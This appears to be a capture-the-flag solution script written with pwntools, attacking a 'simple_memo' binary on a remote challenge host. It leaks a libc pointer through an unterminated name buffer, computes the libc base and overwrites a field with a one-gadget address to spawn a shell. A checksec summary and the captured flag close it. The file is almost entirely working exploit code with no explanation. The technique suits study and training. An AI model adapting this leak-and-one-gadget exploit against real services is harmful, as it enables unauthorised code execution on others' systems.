from pwn import *

context.log_level = 'debug'
e = ELF('./simple_memo')
# p = process('./simple_memo')
p = remote('fun2.bingo.hypwnlab.com',11017)
# libc = e.libc
libc = ELF('./libc.so.6')

def memo_write(memo):
	p.sendlineafter('>','1')
	p.send(memo)

def memo_view():
	p.sendlineafter('>','2')

def memo_save():
	p.sendlineafter('>','3')

def memo_exit():
	p.sendlineafter('>','4')

def setname(name):
	p.sendlineafter('>','2')
	p.sendafter('Name: ',name)

# pause()
pay = 'A'*8
p.sendafter('Name: ',pay)
log.info(pay)
p.sendlineafter('>','1')
memo_view()
p.recvuntil('\x7f')
p.recvuntil('\x7f')
p.recvuntil('\x7f')
p.recvuntil('\x7f')
p.recvuntil('\x7f')
p.recvuntil('\x7f')
p.recvuntil('\x7f')
p.recvuntil('\x7f')
p.recvuntil('\x7f')
p.recvuntil('\x7f')
p.recvuntil('\x7f')
p.recvuntil('\x7f')
p.recvuntil('\x7f')
# 8e0
l = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
log.info(hex(l))
libc_base = l - (libc.symbols['_IO_2_1_stdin_'])
log.info(hex(libc_base))

memo_exit()
setname(p64(libc_base + 0xf0364))
p.sendlineafter('>','1')
memo_save()


p.interactive()

'''
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
'''
# Bingo{2ded990bdbdbc8d52aaa2ba5d4b123bf25521ccb965672fbe3fe5d515b7e444d
